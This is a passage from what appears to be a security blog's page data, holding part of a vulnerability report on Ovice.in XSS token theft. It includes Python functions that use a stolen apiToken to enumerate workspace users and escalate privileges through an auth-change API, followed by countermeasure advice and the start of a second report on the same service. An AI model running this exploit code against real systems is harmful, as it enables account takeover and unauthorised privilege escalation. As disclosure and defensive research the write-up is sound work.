1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gathering necessary information.</h3>\n<ul>\n<li>After the elevation of authority is completed, call the <code class=\"language-text\">/api/v1/workspace/getDashboardWorkspaceUsers</code> API to steal the information necessary for the elevation of authority. (<code class=\"language-text\">workspace_user_id</code>, <code class=\"language-text\">workspace_id</code>, <code class=\"language-text\">user_id</code>)</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">getDashbordInfo</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    Headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"Host\"</span><span class=\"token punctuation\">:</span> self<span class=\"token punctuation\">.</span>target_url<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Authorization\"</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"Bearer </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>self<span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\"># What is auth</span>\n    auth <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[?] What is auth? (admin/member/guest) : \"</span><span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"workspace_id\"</span><span class=\"token punctuation\">:</span> self<span class=\"token punctuation\">.</span>workspace_id<span class=\"token punctuation\">,</span> <span class=\"token string\">\"auth\"</span><span class=\"token punctuation\">:</span> auth<span class=\"token punctuation\">}</span>\n    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>\n        <span class=\"token string-interpolation\"><span class=\"token string\">f\"https://</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>self<span class=\"token punctuation\">.</span>target_url<span class=\"token punctuation\">}</span></span><span class=\"token string\">/api/v1/workspace/getDashboardWorkspaceUsers\"</span></span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>Headers<span class=\"token punctuation\">)</span>\n    state <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># input name, id, email, user_id, workspace_id, auth, room_id,</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>target_user<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">'workspace_user_id'</span><span class=\"token punctuation\">:</span> i<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'email'</span><span class=\"token punctuation\">:</span> i<span class=\"token punctuation\">[</span><span class=\"token string\">'email'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'user_id'</span><span class=\"token punctuation\">:</span> i<span class=\"token punctuation\">[</span><span class=\"token string\">'user_id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                                       <span class=\"token string\">'workspace_id'</span><span class=\"token punctuation\">:</span> i<span class=\"token punctuation\">[</span><span class=\"token string\">'workspace_id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'auth'</span><span class=\"token punctuation\">:</span> i<span class=\"token punctuation\">[</span><span class=\"token string\">'auth'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'room_id'</span><span class=\"token punctuation\">:</span> i<span class=\"token punctuation\">[</span><span class=\"token string\">'room_id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span>\n    <span class=\"token comment\"># output self.target_user name</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>target_user<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"[+] </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>i<span class=\"token punctuation\">}</span></span><span class=\"token string\"> \"</span></span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"============================\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># element output</span>\n        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>target_user<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"[+] </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>j<span class=\"token punctuation\">}</span></span><span class=\"token string\"> : </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>self<span class=\"token punctuation\">.</span>target_user<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"============================\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h3 id=\"privilege-escalation-proceeding-after-session-hijacking\" style=\"position:relative;\"><a href=\"#privilege-escalation-proceeding-after-session-hijacking\" aria-label=\"privilege escalation proceeding after session hijacking permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Privilege escalation proceeding after session hijacking</h3>\n<ul>\n<li><code class=\"language-text\">/api/v1/workspaceUser/change/auth</code> api only verifies the authority for the stolen <code class=\"language-text\">apiToken</code>, so based on the stolen token, <code class=\"language-text\">workspace_user_id_to_update</code>, <code class=\"language-text\">workspace_user_id</code>, <code class=\"language-text\">workspace_id</code>, and <code class=\"language-text\">auth</code> data are made into a target form, and then POST requests to complete the elevation of the authority.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">changeAuth</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    Headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"Host\"</span><span class=\"token punctuation\">:</span> self<span class=\"token punctuation\">.</span>target_url<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"Authorization\"</span><span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"Bearer </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>self<span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\"># Who is admin</span>\n    name <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Who is admin? : \"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># What is auth</span>\n    auth <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] What is auth? : \"</span><span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"workspace_user_id_to_update\"</span><span class=\"token punctuation\">:</span> self<span class=\"token punctuation\">.</span>target_user<span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'workspace_user_id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"workspace_user_id\"</span><span class=\"token punctuation\">:</span> self<span class=\"token punctuation\">.</span>target_user<span class=\"token punctuation\">[</span>name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'workspace_user_id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"workspace_id\"</span><span class=\"token punctuation\">:</span> self<span class=\"token punctuation\">.</span>workspace_id<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"auth\"</span><span class=\"token punctuation\">:</span> auth\n            <span class=\"token punctuation\">}</span>\n    res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>\n        <span class=\"token string-interpolation\"><span class=\"token string\">f\"https://</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>self<span class=\"token punctuation\">.</span>target_url<span class=\"token punctuation\">}</span></span><span class=\"token string\">/api/v1/workspaceUser/change/auth\"</span></span><span class=\"token punctuation\">,</span>\n        data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span>\n        headers<span class=\"token operator\">=</span>Headers<span class=\"token punctuation\">)</span>\n    state <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"security-countermeasure\" style=\"position:relative;\"><a href=\"#security-countermeasure\" aria-label=\"security countermeasure permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Security Countermeasure</h2>\n<h3 id=\"secure-authentication-session-management\" style=\"position:relative;\"><a href=\"#secure-authentication-session-management\" aria-label=\"secure authentication session management permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Secure authentication session management</h3>\n<ul>\n<li><code class=\"language-text\">apiToken</code>, which is used for all authorization authentication, is used the same within all workspaces that the user is accessing.</li>\n<li>Services that require permission in a web application must require logic for permission verification, but currently perform authorization inspection with Security Header attributes and use <code class=\"language-text\">apiToken</code> at this time.</li>\n<li>However, token management problems arise where the token is stored.</li>\n<li>Tokens required for authorization authentication must use arbitrarily generated tokens, not the same tokens, when the user accesses another worksapse.</li>\n<li>In token management, the method of storing tokens should store session cookie values rather than window objects.\n<ul>\n<li>Apply Host Only, Session, and Secure Cookie Security Policy.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"safe-data-management\" style=\"position:relative;\"><a href=\"#safe-data-management\" aria-label=\"safe data management permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Safe data management.</h3>\n<ul>\n<li>If you send a request to the server, you must create and send a data format that cannot be inferred from the outside.</li>\n<li>This is because when checking data such as current user_id and workspace_id, it was immediately confirmed that integer values were used when they were generated sequentially.</li>\n<li>Key and value values should be made in a format not related to service logic so that data closely related to database cannot be recognized from the outside.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#attack-type\">Attack Type</a></p>\n</li>\n<li>\n<p><a href=\"#attack-effect\">Attack Effect</a></p>\n</li>\n<li>\n<p><a href=\"#found-location\">Found Location</a></p>\n</li>\n<li>\n<p><a href=\"#attack-point\">Attack Point</a></p>\n<ul>\n<li><a href=\"#csrf-token-management\">csrf-token management</a></li>\n<li><a href=\"#unsafe-token-management\">Unsafe token management.</a></li>\n<li><a href=\"#unsafe-token-management-1\">Unsafe token management.</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#xss-attack-to-steal-apitoken\">xss attack to steal apiToken</a></p>\n<ul>\n<li><a href=\"#you-thought-it-was-safe-right\">You thought it was safe, right?</a></li>\n<li><a href=\"#child-frame-escape\">child frame escape</a></li>\n<li><a href=\"#user-permission-setting-api\">User Permission Setting API</a></li>\n<li><a href=\"#increase-authority-using-administrator-function-based-on-session-stealing-through-xss-attack\">Increase authority using administrator function based on session stealing through XSS attack.</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#payload\">Payload</a></p>\n<ul>\n<li><a href=\"#stealing-apitoken-sessions-using-xss-attacks\">Stealing apiToken sessions using XSS attacks.</a></li>\n<li><a href=\"#gathering-necessary-information\">Gathering necessary information.</a></li>\n<li><a href=\"#privilege-escalation-proceeding-after-session-hijacking\">Privilege escalation proceeding after session hijacking</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#security-countermeasure\">Security Countermeasure</a></p>\n<ul>\n<li><a href=\"#secure-authentication-session-management\">Secure authentication session management</a></li>\n<li><a href=\"#safe-data-management\">Safe data management.</a></li>\n</ul>\n</li>\n</ul>\n</div>\n<div class=\"gatsby-highlight\" data-language=\"toc\"><pre class=\"language-toc\"><code class=\"language-toc\"></code></pre></div>","excerpt":"Attack Type XSS Weak algorithm Hardcoded credentials Attack Effect Security Check Bypass Privilege Escalation Found Location It is a related page that proceeds with token management when logging in to the initial account. It can be seen that  data of the App object, which is a window object sub-attribute, is managed. The  object deals with the  data type, which is used as a branch to conduct socket communication suitable for the authority. Authority management for the user is performed, and the","frontmatter":{"date":"August 01, 2022","title":"Ovice.in XSS based unsafe token theft and elevated authority 0-day Vulnerability Report","categories":"0-day","author":"Zer0Luck","emoji":""},"fields":{"slug":"/Ovice.in-Picket-Static-Object-XSS-0-day-Vulnerability-Report/"}},"next":{"id":"d634b5ee-fafd-52ad-ba50-87ab88d92855","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACwUlEQVQoz02S/U8TBxjH7x/bXzF/2PzRZXMvYYkuU7eQiJmBotK3u2uvcNe7oxz02mvFtAi0Vm05eoVWJ4RQ58BsyX4gMCQNL6UQ/Zie0fhNnnzzvOT7fJPnEWwtiCENY2thxuMJRm4NkpQCmLEAGS2EJgeZmkqzVHNprrawUhaLWZXOP6vMTsUw5GH+fOrw/6tl3GoVIXFviPREEDM+hizKSPduo4Zu0a/bWgg5dAddT1F59BjPW2FhvsSTuRyP8klS8VGS0T/IamM8fpCiUfcQdDWIoUlEIjEydhZFUVFkiQeOSkJJoKk6+fwshcIcrlun2XxGvd7ATtvkczmKhSLZTAY7naFWdRGSWpS1tSZ9HB8f0+v1ODs7o3PUodvtsr+/T6fT4eTkxM8/9Ht8xPn5uc9rL15w38kgzCTust6q+8V379763Gw9Z7P9ivX1dYrFIpVKhcPDw0+i/Tg6OvINfBTf2NhgxrIQorev8dyr8jlOul3Oeue+QN/hm4M3Pvfj4OCAvb09dnZ22N3d5fT09IOJ1SbhUARBjd+hcH/Gv6BXr9PwGiy7S7huidVGg5XGij/caj3ze57nsfX3Ftvbr9na2mZzs83Ll39RKpWx02kEw4yh6wrhsMikOYkkyqgT46RSEmJUJCYrGLqJaZgk4gpJTWc6ZXF9YIDA0BBpy0JVYkwaSRxLR8ibIsnoMKGRm8RjMZRoiKWHObJaCHH0JuG7I9jpHDknj6EbTKUsclmHK5e/5dpPP5B3HEoL8zSWq8znpxGUsSFmJsZYdDRiksx4ZITpxChiYJCSo5KaEAkGA8SjEXRNxzQmKZcrDPz4PYNXr1AszNFut/nv39e4pVmE/lOrkQDfXPoOWVK4cf13fvvlZ8rZBIM3fvXzry98waWvvkTXDPSkwdMnNUxV4/LFiywulPwFtXKR2kOH99z0sESuHvxoAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Ovice.in picket XSS\"\n        title=\"Ovice.in picket XSS\"\n        src=\"/static/af2946049106c268d034e8adbba39de6/37523/sss-2.png\"\n        srcset=\"/static/af2946049106c268d034e8adbba39de6/e9ff0/sss-2.png 180w,\n/static/af2946049106c268d034e8adbba39de6/f21e7/sss-2.png 360w,\n/static/af2946049106c268d034e8adbba39de6/37523/sss-2.png 720w,\n/static/af2946049106c268d034e8adbba39de6/302a4/sss-2.png 1080w,\n/static/af2946049106c268d034e8adbba39de6/07a9c/sss-2.png 1440w,\n/static/af2946049106c268d034e8adbba39de6/29114/sss-2.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"attack-type\" style=\"position:relative;\"><a href=\"#attack-type\" aria-label=\"attack type permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Type</h2>\n<ul>\n<li>XSS</li>\n<li>Weak algorithm.</li>\n</ul>\n<h2 id=\"attack-effect\" style=\"position:relative;\"><a href=\"#attack-effect\" aria-label=\"attack effect permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Effect</h2>\n<ul>\n<li>Security Check Bypass</li>\n<li>Privilege Escalation</li>\n</ul>\n<h2 id=\"found-location\" style=\"position:relative;\"><a href=\"#found-location\" aria-label=\"found location permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Found Location</h2>\n<ul>\n<li>Users of administrative authority have the authority to create static objects.</li>\n<li>A <code class=\"language-text\">Picket object</code> exists in a Statistic Object.</li>\n<li><code class=\"language-text\">Picket objects</code> provide a variety of contents using the editor function.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 73.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAAD/ElEQVQ4y32U3U9bdRjHf9OxzWjizZxxusQtFCMzyzBZTJYY442JJl7tH/DOS/XGa680mduNy1jY1k4M0ELfW2jpG6VAC22hcGjpK6wv0ANtz2nLeevLes7XFDdJvPCbfPLcPPlcPE+eh7w/eOvcG4ScI4QMvOQCIYS8ee7iFx9e/SQ8PHzLPzQ04h8cvBl9+62L3xJyh/x85/sLlwkZ+JiQgfOEDLx35cb56x99dmZ4+DYhE6Pqa+zBQVCoN1JdQYh3eCFxVCrF6UIxtbe9XXhw9/fCktdXcJgtBf2UNZ1O5ONu+2zCYTLHxx78sWOZmty0jGuvAyB9iGPKMCQyjNjmOPREEWi3QBcKYMo0jukDGGe02Ekm4Zj3wmX6DSHXPfj9fsz7fDCY9Vhe8MJvsI68FJ4h1r90KqFSqXGVCvhK5QXHNOUeL/QUUZSFQ1qhtmJyOpuVN2JbiuHhN/LDX77sJWIuec7p69ltRmXR7WjZnk3ePBU+/lMlNBssL0ngRVFu9fBvOs0mkok4kuk0TGYbrIZHiCzr4PH6MDc3pwRCiwgtL3QMo+pToWVMoxIbTVYURbQlUaYrLPZyuygWCqiXSkhTFJYCAegmpzBndyKbeY6AfxFel0txzFqx4nN3Zse1p0Kn3qRij+osW6bB16qyxDKolkpg9vch1GroShIkjkNbENA5gT+pLY5TeLYO6fi44/X4P+0LE/HYWWId16nEWpUVGg3wLCuLjSbaPI8Oz0ORJPxPlFeTSWeKqnB4hfz04w+EWMeeqo6ZJiu22mi1u7LUaqHT7Z50y5KERDwOiqJQqzGoMQzKZRqNRgOCKCr04SFyuVzPbDIaJicnxmbttvvEMu5XtZlMbcX0HSrP/S9kBb3jZvMEjqn11BqNotXpkE6nlXg8jvUNCslUFjR9iEgkqrg9HjzRqKF5psH0jK5LXIbMUOtoVdLc/Qq5TR36xmKxiHyhgKPyPnR6LZYDASWZSiES3UDQ+xQpyot8vqQsLy8hsLKimBz27oJvXllc9B2S0V/vXxUqzHyvng2360yw3eRCsiCEZF5Y4aqV6GaC6sRi60jndpVNahtO4z0kKR+q9WMsBpbg9nih004qjlkLZqa1VXLpgxv9+339P5ztb82iNVze2knQiZ0d5HZ3ZafTCaPJhmAojHQmC7PZAo/HA7vdrES21mAxGarkyrWR/i8g75A58ip9mVE9TjK57KV8MV8ul8ugqG3ZarFCq9WiL15fX4der4fb7YbNZlai21EY9dNV8vntr8nEIzWZfjJOdI//IRZZf42iKBJeW3u3yXHlVqeDfZqWN7coBIOryO3tocbWEVpdQ2h1FXa7VXG55zHvdFT/BqdqfECjP5gNAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Static Object Maker\"\n        title=\"Static Object Maker\"\n        src=\"/static/b7c376d702e2f42939118362db64866a/37523/x_22.png\"\n        srcset=\"/static/b7c376d702e2f42939118362db64866a/e9ff0/x_22.png 180w,\n/static/b7c376d702e2f42939118362db64866a/f21e7/x_22.png 360w,\n/static/b7c376d702e2f42939118362db64866a/37523/x_22.png 720w,\n/static/b7c376d702e2f42939118362db64866a/302a4/x_22.png 1080w,\n/static/b7c376d702e2f42939118362db64866a/07a9c/x_22.png 1440w,\n/static/b7c376d702e2f42939118362db64866a/869d7/x_22.png 1477w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token operator\">/</span>console<span class=\"token operator\">/</span>objects</code></pre></div>\n<ul>\n<li><code class=\"language-text\">/api/v1/object/add</code> api is called when installing a static object. When clicking on the installed static object, <code class=\"language-text\">/api/v1/object/click</code> api is called. When modifying the installed static object, the <code class=\"language-text\">/api/v1/updateStaticObjectData</code> api is called.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token operator\">/</span>api<span class=\"token operator\">/</span>v1<span class=\"token operator\">/</span>object<span class=\"token operator\">/</span>add\n<span class=\"token operator\">/</span>api<span class=\"token operator\">/</span>v1<span class=\"token operator\">/</span>object<span class=\"token operator\">/</span>click\n<span class=\"token operator\">/</span>api<span class=\"token operator\">/</span>v1<span class=\"token operator\">/</span>updateStaticObjectData</code></pre></div>\n<h2 id=\"attack-point\" style=\"position:relative;\"><a href=\"#attack-point\" aria-label=\"attack point permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Attack Point</h2>\n<ul>\n<li>If you have a user account who has permission to modify within the workspace where the static object is installed, you can modify html by activating the function of the <code class=\"language-text\">editor</code>.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 69.44444444444444%; position: relative; bottom: 0; left: 